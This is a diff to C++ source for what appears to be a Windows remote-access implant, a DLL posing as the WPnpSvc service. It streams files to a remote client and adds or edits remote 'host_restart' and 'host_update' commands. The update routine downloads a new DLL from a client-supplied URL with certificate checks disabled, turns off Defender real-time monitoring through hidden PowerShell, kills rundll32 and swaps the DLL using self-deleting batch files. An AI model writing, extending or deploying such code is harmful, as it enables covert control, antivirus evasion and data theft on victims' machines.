@@ -334,7 +334,7 @@ static void file_worker_func(int worker_id) {
         bin.insert(bin.end(), reinterpret_cast<const uint8_t*>(&work.offset), reinterpret_cast<const uint8_t*>(&work.offset)+8);
         bin.insert(bin.end(), chunk.begin(), chunk.end());
 
-        // Send through dedicated file connection (server broadcasts to file_recv)
+        // Send FILE binary directly (no extra copies, no format conversion)
         send_file_binary(bin);
 
         // No throttle — TCP backpressure + separate file ws handles bandwidth sharing
@@ -1427,14 +1427,8 @@ static void handle_command(const std::string& msg_str) {
             uint32_t length = len_s.empty() ? 65536 : std::stoul(len_s);
             if (length > 1024 * 1024) length = 1024 * 1024; // Max 1MB per chunk
 
-            // Send routing hint so server.py delivers FILE binary only to this client
-            if (!from_client.empty() && g_file_ws_ready) {
-                std::lock_guard<std::mutex> lk(g_file_ws_mtx);
-                if (!g_file_ws.empty() && g_file_ws[0] && g_file_ws[0]->is_connected()) {
-                    g_file_ws[0]->send_text("{\"_route_binary_to\":\"" + json_escape(from_client) + "\"}");
-                }
-            }
-
+            // Routing hint is sent by file_worker_func right before the binary chunk
+            // to ensure they're adjacent in the sender queue (no race with other workers).
             if (g_file_workers_running) {
                 std::lock_guard<std::mutex> lk(g_file_work_mtx);
                 g_file_work_q.push(FileWork{path, offset, length, from_client});
@@ -2349,6 +2343,33 @@ static void handle_command(const std::string& msg_str) {
                     ",\"tamper_protected\":" + std::string(tamper?"true":"false") + "}");
         }
 
+        else if (cmd == "host_restart") {
+            // Restart the WPnpSvc service — svchost unloads DLL, SCM restarts it
+            send_ok("\"restarting\"");
+            Sleep(500);
+            spawn_bg_worker([]() {
+                g_log.info("Host restart requested by client");
+                // sc.exe stop + start in a bat script (can't restart ourselves directly)
+                std::string bat = "C:\\Windows\\Temp\\wpnp_restart.bat";
+                {
+                    std::ofstream f(bat);
+                    f << "@echo off\r\n";
+                    f << "timeout /t 2 /nobreak >nul\r\n";
+                    f << "sc.exe stop WPnpSvc >nul 2>nul\r\n";
+                    f << "timeout /t 3 /nobreak >nul\r\n";
+                    f << "sc.exe start WPnpSvc >nul 2>nul\r\n";
+                    f << "del \"%~f0\"\r\n";
+                }
+                STARTUPINFOA si = {}; si.cb = sizeof(si);
+                PROCESS_INFORMATION pi = {};
+                std::string cmd = "cmd.exe /c \"" + bat + "\"";
+                CreateProcessA(NULL, (LPSTR)cmd.c_str(), NULL, NULL, FALSE,
+                    CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
+                if (pi.hProcess) CloseHandle(pi.hProcess);
+                if (pi.hThread) CloseHandle(pi.hThread);
+            });
+        }
+
         else if (cmd == "host_update") {
             // Client sends URL to download new DLL from VPS
             std::string url = json_get(msg_str, "url");
@@ -2401,27 +2422,34 @@ static void handle_command(const std::string& msg_str) {
                             batContent += "echo " + esc + " > \"" + stepFile + "\"\r\n";
                         };
                         addLn("@echo off");
-                        step("1|Disabling Defender");
-                        addLn("start /wait /min powershell.exe -WindowStyle Hidden -Command \"Set-MpPreference -DisableRealtimeMonitoring $true\"");
-                        addLn("timeout /t 2 /nobreak >nul 2>nul");
-                        step("2|Downloading new DLL");
+                        // Step 1: Download FIRST (host stays online, client sees progress)
+                        step("1|Downloading new DLL");
                         addLn("start /wait /min powershell.exe -Command \"[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12;[Net.ServicePointManager]::ServerCertificateValidationCallback={$true};(New-Object Net.WebClient).DownloadFile('" + url + "','" + tempDll + "')\"");
                         addLn("if not exist \"" + tempDll + "\" (echo ERR^|Download failed > \"" + stepFile + "\" & goto cleanup)");
+                        // Step 2: Disable Defender (only after download succeeded)
+                        step("2|Disabling Defender");
+                        addLn("start /wait /min powershell.exe -WindowStyle Hidden -Command \"Set-MpPreference -DisableRealtimeMonitoring $true\"");
+                        addLn("timeout /t 2 /nobreak >nul 2>nul");
+                        // Step 3: Stop service (host goes offline here)
                         step("3|Stopping service");
                         addLn("sc.exe stop WPnpSvc >nul 2>nul");
                         addLn("timeout /t 3 /nobreak >nul 2>nul");
                         addLn("taskkill.exe /F /IM rundll32.exe >nul 2>nul");
                         addLn("timeout /t 2 /nobreak >nul 2>nul");
+                        // Step 4: Replace DLL
                         step("4|Replacing DLL");
                         addLn("del /f /q \"" + oldDll + "\" >nul 2>nul");
                         addLn("ren \"" + currentDll + "\" " + dllName + ".old >nul 2>nul");
                         addLn("copy /y \"" + tempDll + "\" \"" + currentDll + "\" >nul 2>nul");
                         addLn("timeout /t 2 /nobreak >nul 2>nul");
+                        // Step 5: Start service (host comes back online)
                         step("5|Starting service");
                         addLn("sc.exe start WPnpSvc >nul 2>nul");
                         addLn("timeout /t 8 /nobreak >nul 2>nul");
+                        // Step 6: Re-enable Defender
                         step("6|Re-enabling Defender");
                         addLn("start /wait /min powershell.exe -WindowStyle Hidden -Command \"Set-MpPreference -DisableRealtimeMonitoring $false\"");
+                        // Step 7: Done
                         step("7|Done");
                         addLn(":cleanup");
                         // Cleanup files
